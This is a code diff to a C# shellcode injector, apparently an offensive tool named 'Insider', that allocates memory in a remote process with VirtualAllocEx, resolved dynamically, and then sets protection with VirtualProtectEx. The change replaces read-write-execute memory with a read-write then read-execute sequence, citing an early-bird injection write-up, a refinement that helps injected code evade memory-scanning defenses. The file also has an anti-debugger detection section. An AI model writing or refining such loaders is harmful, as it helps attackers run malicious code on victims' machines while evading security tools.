@@ -204,7 +204,9 @@ namespace Insider
         [Flags]
         public enum MemoryProtection
         {
-            PAGE_EXECUTE_READWRITE = 0x40,
+	    PAGE_READWRITE = 0x04,
+            PAGE_EXECUTE_READ = 0x20,
+            PAGE_EXECUTE_READWRITE = 0x40
         }
 
         // =============================================== Attached Debugger Detection: Flags and Functions ========================================
@@ -733,7 +735,7 @@ namespace Insider
 
                 IntPtr funcaddr2 = GetProcAddress(LoadLibrary(kernel), "VirtualAllocEx");
                 vallocx vax = (vallocx)Marshal.GetDelegateForFunctionPointer(funcaddr2, typeof(vallocx));
-                IntPtr createdBuffer = vax(rphandle, IntPtr.Zero, (UInt32)shellcode.Length, (UInt32)AllocationType.MEM_COMMIT | (UInt32)AllocationType.MEM_RESERVE, (UInt32)MemoryProtection.PAGE_EXECUTE_READWRITE);
+                IntPtr createdBuffer = vax(rphandle, IntPtr.Zero, (UInt32)shellcode.Length, (UInt32)AllocationType.MEM_COMMIT | (UInt32)AllocationType.MEM_RESERVE, (UInt32)MemoryProtection.PAGE_READWRITE);
                 
                 //Console.WriteLine("[?] PE mapped at     : " + String.Format("{0:X}", (ManMap.ModuleBase).ToInt64()));
 
@@ -766,15 +768,17 @@ namespace Insider
 
                 IntPtr funcaddr4 = GetProcAddress(LoadLibrary(kernel), "VirtualProtectEx");
                 VPEx vpex = (VPEx)Marshal.GetDelegateForFunctionPointer(funcaddr4, typeof(VPEx));
-                bool check = vpex(rphandle, createdBuffer, (UIntPtr) shellcode.Length, 0x40,  /* PAGE_EXECUTE_READ_WRITE */ out uint _);
+		// Acc. to https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention#programming-considerations,
+		// Applying page execute read to memory and also see the paragraph where DEP is present, https://dosxuz.gitlab.io/post/earlybird_dinvoke/ (find: DEP).
+                bool check = vpex(rphandle, createdBuffer, (UIntPtr) shellcode.Length, (UInt32)MemoryProtection.PAGE_EXECUTE_READ, out uint _);
 
                 if(check == true)
                 {
-                    Console.WriteLine("[+] Permission of the memory region is RWX");
+                    Console.WriteLine("[+] Permission of the memory region is RX");
                 }
                 else
                 {
-                    Console.WriteLine("[-] Oops! Permission of the memory region isn't RWX");
+                    Console.WriteLine("[-] Oops! Permission of the memory region isn't RX");
                     System.Environment.Exit(1);
                 }
 
